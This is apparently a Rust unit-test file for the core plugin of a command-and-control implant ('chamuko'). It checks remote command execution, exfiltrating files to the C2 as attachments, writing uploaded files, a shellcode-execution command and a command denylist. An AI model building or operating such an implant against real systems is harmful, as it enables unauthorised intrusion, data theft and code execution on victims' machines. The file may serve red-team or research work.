use super::*;
use chamuko_core::PluginRegistry;
use chamuko_plugin_api::Plugin;

fn registry() -> PluginRegistry {
    let mut registry = PluginRegistry::new();
    registry.register(Box::new(core_plugin())).unwrap();
    registry
}

fn run(registry: &mut PluginRegistry, command: &str, args: &[&str]) -> Result<CommandOutput, String> {
    let args: Vec<String> = args.iter().map(|a| a.to_string()).collect();
    registry
        .execute(command, &args, std::path::Path::new("."))
        .map_err(|e| e.to_string())
}

fn tmpdir(tag: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("chamuko-cmd-{tag}-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

#[test]
fn every_declared_command_is_routed() {
    let registry = registry();
    for name in [
        "exec",
        "info",
        "whoami",
        "hostname",
        "pwd",
        "ls",
        "cd",
        "shellcode",
        "ps",
        "download",
        "upload",
    ] {
        assert!(registry.supports(name), "{name} must be routed");
    }
}

#[test]
fn plugin_metadata_is_reported() {
    let plugin = core_plugin();
    assert_eq!(plugin.metadata().id, "core");
    assert_eq!(plugin.command_names().len(), 11);
}

#[test]
fn help_lists_every_command_with_a_summary() {
    let help = registry().help();
    assert!(help.contains("exec <cmd> [args...]"));
    assert!(help.contains("download <path>"));
    assert!(help.contains("upload <path> <b64>"));
}

#[test]
fn arity_errors_point_at_the_usage() {
    let mut registry = registry();
    let err = run(&mut registry, "download", &[]).unwrap_err();
    assert!(err.contains("usage: download <path>"), "got: {err}");
}

#[test]
fn info_reports_the_local_host() {
    let mut registry = registry();
    let out = run(&mut registry, "info", &[]).unwrap();
    assert!(out.stdout.contains("host:"));
    assert!(out.stdout.contains("pid:"));
    assert_eq!(out.exit_code, 0);
}

#[test]
fn exec_runs_in_the_given_cwd() {
    let mut registry = registry();
    let dir = tmpdir("exec");
    let args = vec!["pwd".to_string()];
    let out = registry.execute("exec", &args, &dir).unwrap();
    assert_eq!(out.stdout.trim(), dir.display().to_string());
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn exec_returns_a_non_zero_code_for_a_failing_command() {
    let mut registry = registry();
    let out = run(&mut registry, "exec", &["sh", "-c", "exit 3"]).unwrap();
    assert_eq!(out.exit_code, 3);
}

#[test]
fn exec_reports_a_missing_binary_instead_of_failing() {
    let mut registry = registry();
    let err = run(&mut registry, "exec", &["no-such-binary-xyz"]).unwrap_err();
    assert!(err.contains("failed to spawn"), "got: {err}");
}

#[test]
fn ls_lists_a_directory_sorted() {
    let dir = tmpdir("ls");
    std::fs::write(dir.join("b.txt"), b"x").unwrap();
    std::fs::write(dir.join("a.txt"), b"x").unwrap();
    let mut registry = registry();
    let args = vec![dir.display().to_string()];
    let out = registry.execute("ls", &args, &dir).unwrap();
    assert_eq!(out.stdout, "a.txt\nb.txt");
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn ls_on_a_missing_directory_errors() {
    let mut registry = registry();
    let err = run(&mut registry, "ls", &["/definitely/not/here"]).unwrap_err();
    assert!(err.contains("ls:"), "got: {err}");
}

#[test]
fn download_returns_the_file_as_an_attachment() {
    let dir = tmpdir("dl");
    let payload = b"datos importantes".to_vec();
    std::fs::write(dir.join("nota.txt"), &payload).unwrap();
    let mut registry = registry();
    let args = vec![dir.join("nota.txt").display().to_string()];
    let out = registry.execute("download", &args, &dir).unwrap();

    let attachment = out.attachment.expect("download must attach the file");
    assert_eq!(attachment.name, "nota.txt");
    assert_eq!(attachment.data, payload);
    // The hash the C2 will verify comes from the same bytes.
    assert_eq!(
        chamuko_protocol::sha256_hex(&attachment.data),
        chamuko_protocol::sha256_hex(&payload)
    );
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn download_refuses_an_empty_file() {
    let dir = tmpdir("dl-empty");
    std::fs::write(dir.join("vacio.txt"), b"").unwrap();
    let mut registry = registry();
    let args = vec![dir.join("vacio.txt").display().to_string()];
    let out = registry.execute("download", &args, &dir).unwrap();
    assert_eq!(out.exit_code, 1);
    assert!(out.stdout.contains("is empty"), "got: {}", out.stdout);
    assert!(out.attachment.is_none());
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn download_refuses_a_directory() {
    let dir = tmpdir("dl-dir");
    std::fs::create_dir(dir.join("sub")).unwrap();
    let mut registry = registry();
    let args = vec![dir.join("sub").display().to_string()];
    let out = registry.execute("download", &args, &dir).unwrap();
    assert_eq!(out.exit_code, 1);
    assert!(out.stdout.contains("not a regular file"), "got: {}", out.stdout);
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn upload_writes_the_decoded_bytes() {
    let dir = tmpdir("up");
    let payload = b"contenido".to_vec();
    let encoded = base64::engine::general_purpose::STANDARD.encode(&payload);
    let mut registry = registry();
    let args = vec![dir.join("out.bin").display().to_string(), encoded];
    let out = registry.execute("upload", &args, &dir).unwrap();
    assert_eq!(out.exit_code, 0);
    assert_eq!(std::fs::read(dir.join("out.bin")).unwrap(), payload);
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn upload_creates_missing_parent_directories() {
    let dir = tmpdir("up-dirs");
    let encoded = base64::engine::general_purpose::STANDARD.encode(b"x");
    let mut registry = registry();
    let args = vec![dir.join("a/b/c.bin").display().to_string(), encoded];
    registry.execute("upload", &args, &dir).unwrap();
    assert!(dir.join("a/b/c.bin").is_file());
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn upload_rejects_invalid_base64() {
    let mut registry = registry();
    let err = run(&mut registry, "upload", &["x.bin", "no-base64!!"]).unwrap_err();
    assert!(err.contains("bad base64"), "got: {err}");
}

#[test]
fn cd_moves_the_base_for_later_relative_paths() {
    let dir = tmpdir("cd");
    std::fs::create_dir(dir.join("inner")).unwrap();
    std::fs::write(dir.join("inner/inside.txt"), b"hola").unwrap();
    let mut registry = registry();

    let args = vec![dir.join("inner").display().to_string()];
    registry.execute("cd", &args, &dir).unwrap();

    // After cd, a relative name must resolve inside the new directory.
    let out = registry.execute("ls", &[], &dir).unwrap();
    assert_eq!(out.stdout, "inside.txt");

    let out = registry
        .execute("download", &["inside.txt".to_string()], &dir)
        .unwrap();
    let attachment = out.attachment.expect("relative download after cd");
    assert_eq!(attachment.data, b"hola");

    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn cd_refuses_a_path_that_is_not_a_directory() {
    let dir = tmpdir("cd-bad");
    let mut registry = registry();
    let args = vec!["nope".to_string()];
    let out = registry.execute("cd", &args, &dir).unwrap();
    assert_eq!(out.exit_code, 1);
    assert!(out.stdout.contains("no such directory"), "got: {}", out.stdout);
    std::fs::remove_dir_all(&dir).ok();
}

#[test]
fn ps_lists_processes() {
    let mut registry = registry();
    let out = run(&mut registry, "ps", &[]).unwrap();
    assert_eq!(out.exit_code, 0);
    assert!(out.stdout.contains("PID"));
}

#[test]
fn shellcode_rejects_invalid_base64() {
    let mut registry = registry();
    let err = run(&mut registry, "shellcode", &["not-base64!!"]).unwrap_err();
    assert!(err.contains("base64 decode"), "got: {err}");
}

#[test]
fn shellcode_rejects_an_empty_payload() {
    let mut registry = registry();
    let out = run(&mut registry, "shellcode", &[""]).unwrap();
    assert_eq!(out.exit_code, 1);
    assert!(out.stdout.contains("empty"), "got: {}", out.stdout);
}

#[test]
fn a_denylist_blocks_the_command_before_it_runs() {
    let policy = chamuko_core::Policy::permissive().deny(["exec"]);
    let mut registry = PluginRegistry::with_policy(policy);
    registry.register(Box::new(core_plugin())).unwrap();

    let err = registry
        .execute("exec", &["pwd".to_string()], std::path::Path::new("."))
        .unwrap_err();
    assert!(err.to_string().contains("denylist"), "got: {err}");
}
